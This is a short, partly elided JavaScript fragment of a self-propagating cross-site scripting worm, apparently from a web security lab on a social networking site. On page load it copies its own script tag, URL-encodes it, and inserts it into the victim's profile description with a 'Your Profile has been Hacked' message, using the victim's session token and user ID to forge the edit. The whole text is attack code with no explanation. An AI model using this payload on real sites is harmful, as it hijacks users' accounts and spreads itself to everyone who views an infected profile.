...
window.onload = async function() {
     ...
     const headerTag = "<script id=\"worm\" type=\"text/javascript\">";
     const jsCode = document.getElementById("worm").innerHTML;
     const tailTag = "</" + "script>";
     
     const WORM_CODE = encodeURIComponent(headerTag + jsCode + tailTag);
     ...
     const DESCRIPTION = "&description=<p>Your Profile has been Hacked.... HAHAHAAHA.</p>" + WORM_CODE; 
     const DESC_LEVEL = "&accesslevel[description]=2";
     ...
     const CONTENT = TOKEN + TIME_STAMP + UNAME + DESCRIPTION + DESC_LEVEL + BRIEF_DESCRIPTION + USERID
